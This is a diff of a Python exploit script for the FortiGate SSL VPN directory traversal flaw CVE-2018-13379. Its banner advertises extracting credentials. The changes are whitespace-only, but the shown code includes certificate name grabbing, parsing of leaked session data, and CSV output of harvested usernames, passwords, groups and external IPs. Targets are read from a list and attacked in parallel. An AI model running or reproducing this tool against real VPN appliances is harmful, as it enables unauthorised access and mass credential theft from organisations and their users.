@@ -1,11 +1,11 @@
 #!/usr/bin/python3
 
 ################################################
-#      ____    _                   _           #
-#     |__  |__| |___ _ __  ___ _ _| |_ ___     #
-#       / / -_) / -_) '  \/ -_) ' \  _(_-<     #
-#      /_/\___|_\___|_|_|_\___|_||_\__/__/     #
-#                                              #
+#	  ____	_				   _		   #
+#	 |__  |__| |___ _ __  ___ _ _| |_ ___	 #
+#	   / / -_) / -_) '  \/ -_) ' \  _(_-<	 #
+#	  /_/\___|_\___|_|_|_\___|_||_\__/__/	 #
+#											  #
 ################################################
 # Extract Useful info (credentials!) from SSL VPN Directory Traversal Vulnerability (FG-IR-18-384)
 # Script Title: FortiVPN CVE-2018-13379 Vulnerability
@@ -95,24 +95,24 @@ def parse(target, process, subjectCN):
 	
 
 def getSubjectCN(url):
-    try:
-        if ':' in url:
-            urlsplit = url.split(':')
-            dst = (urlsplit[0],int(urlsplit[1]))
-        else:
-            dst = (url,443)
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(10)
-        s.connect(dst)
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        s = ctx.wrap_socket(s, server_hostname=dst[0])
-        cert_bin = s.getpeercert(True)
-        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1,cert_bin)
-        return x509.get_subject().CN
-    except: 
-        return '[?] SSL NAME Grab Error Proberbly Timed Out'
+	try:
+		if ':' in url:
+			urlsplit = url.split(':')
+			dst = (urlsplit[0],int(urlsplit[1]))
+		else:
+			dst = (url,443)
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.settimeout(10)
+		s.connect(dst)
+		ctx = ssl.create_default_context()
+		ctx.check_hostname = False
+		ctx.verify_mode = ssl.CERT_NONE
+		s = ctx.wrap_socket(s, server_hostname=dst[0])
+		cert_bin = s.getpeercert(True)
+		x509 = crypto.load_certificate(crypto.FILETYPE_ASN1,cert_bin)
+		return x509.get_subject().CN
+	except: 
+		return '[?] SSL NAME Grab Error Proberbly Timed Out'
 
 def grabuser(target, process, frombyte, subjectCN):	
 	extip = grabtext(process,frombyte+1)
@@ -155,7 +155,7 @@ def getBinarytext(process,startbyte,endbyte):
 					text = text + '...'
 					unprintable = True
 	except Exception as e:   
-	    print('[!] '+str(e))
+		print('[!] '+str(e))
 	return text
 
 def isIP(lookup):
@@ -203,7 +203,7 @@ if __name__ == '__main__':
 	print("""  ___ ___  ___ _____ ___ ___   _ _____ ___ 
 	 | __/ _ \\| _ \\_   _|_ _/ __| /_\\_   _| __|
 	 | _| (_) |   / | |  | | (_ |/ _ \\| | | _| 
-	 |_| \\___/|_|_\\ |_| |___\\___/_/ \\_\\_| |___|                                                                   
+	 |_| \\___/|_|_\\ |_| |___\\___/_/ \\_\\_| |___|																   
 	""")
 	print("Extract Useful info (credentials!) from SSL VPN Directory Traversal Vulnerability (FG-IR-18-384)")
 	print("Tool originally developed by @x41x41x41 and @DavidStubley.")
@@ -212,12 +212,12 @@ if __name__ == '__main__':
 
 	# Read and kickoff processing
 	with open('summary.txt', mode='a') as csvfile:
-	    CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
-	    CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Result')])
+		CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
+		CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Result')])
 	if CREDSCAN.lower() == 'y':
 		with open(OUTPUTFILE, mode='a') as csvfile:
-		    CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
-		    CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Username'), str('Password'), str('Group'), str('External IP')])
+			CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
+			CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Username'), str('Password'), str('Group'), str('External IP')])
 	targets = open(INPUT, "r").readlines()
 	pool = Pool(processes=MAXPROCESSES)
 	pool.map(exploit, targets)
